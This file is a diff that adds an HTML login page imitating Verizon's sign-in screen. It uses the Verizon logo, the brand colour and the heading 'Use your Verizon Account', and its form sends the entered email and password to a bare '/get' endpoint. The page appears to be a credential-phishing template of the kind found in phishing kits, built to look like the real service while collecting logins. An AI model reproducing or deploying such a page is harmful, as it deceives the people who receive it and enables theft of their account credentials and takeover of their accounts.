@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fff;
+        }
+        .login-container {
+            width: 90%;
+            max-width: 400px;
+            margin: auto;
+            padding: 20px;
+            border: 1px solid #e9e9e9;
+            border-radius: 5px;
+            margin-top: 50px;
+            background-color: #fff;
+        }
+        #logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .g-h1 {
+            font-weight: 300;
+            font-size: 24px;
+            margin-top: 5px;
+            text-align: center;
+        }
+        .g-h2 {
+            font-weight: 200;
+            font-size: 16px;
+            margin-top: 10px;
+            text-align: center;
+            color: #D52B1E;
+        }
+        .g-input {
+            width: calc(100% - 20px);
+            margin-top: 15px;
+            height: 40px;
+            padding: 5px 10px;
+            font-size: 16px;
+            color: #14171a;
+            border: 1px solid #e6ecf0;
+            border-radius: 5px;
+            background-color: #f5f8fa;
+        }
+        .gbtn-primary {
+            margin-top: 20px;
+            width: 100%;
+            height: 40px;
+            font-size: 16px;
+            color: #fff;
+            background-color: #D52B1E;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .gbtn-primary:hover {
+            background-color: #B3291B;
+        }
+        .gbtn-primary:disabled {
+            background-color: #aab8c2;
+            cursor: not-allowed;
+        }
+    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+</head>
+<body>
+    <div id="login-app">
+        <div class="login-container">
+            <div id="logo">
+                <svg xmlns="http://www.w3.org/2000/svg" xml:space="preserve" viewBox="0 0 658 146">
+                    <path fill="#D52B1E" d="m644 0-36 77-14-29h-14l22 47h12l44-95z"/>
+                    <path d="M490 143h29V90c0-12 7-21 17-21s15 7 15 17v57h29V81c0-21-12-36-33-36-13 0-22 6-29 16V48h-28v95zm-57-98c-30 0-51 22-51 50 1 29 21 51 51 51s50-22 50-51c0-28-20-50-50-50zm0 79c-14 0-21-11-21-29 0-17 7-28 21-28 13 0 21 11 21 28 0 18-7 29-21 29zm-133 19h81v-23h-46v-1l44-49V48h-79v23h45l-45 50v22zm-37 0h29V48h-29v95zm-67 0h29V99c0-20 11-29 30-26V48l-6-1c-11 0-19 5-25 17h-1V48h-28v95zm-54-19c-12 0-20-8-22-21h69c0-20-6-36-17-47-8-7-18-11-32-11-28 0-48 22-48 50 0 29 19 50 50 50 12 0 21-3 29-8 9-6 15-14 16-22h-28c-2 6-8 9-17 9zm-1-58c10 0 17 7 18 18h-39c3-11 9-18 21-18zM34 143h30l33-95H68l-18 61h-1L31 48H1l33 95zM263 14h29v26h-29V14z"/>
+                </svg>
+            </div>
+            <form action="/get" id="email-form-step">
+                <h1 class="g-h1">Sign in</h1>
+                <h2 class="g-h2">Use your Verizon Account</h2>
+                <div class="login-content">
+                    <input name="email" type="text" class="g-input" placeholder="Email" required> 
+                    <input name="password" type="password" class="g-input" placeholder="Password" required>
+                    <div>
+                        <button class="gbtn-primary" type="submit">Next</button>
+                    </div>
+                </div>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
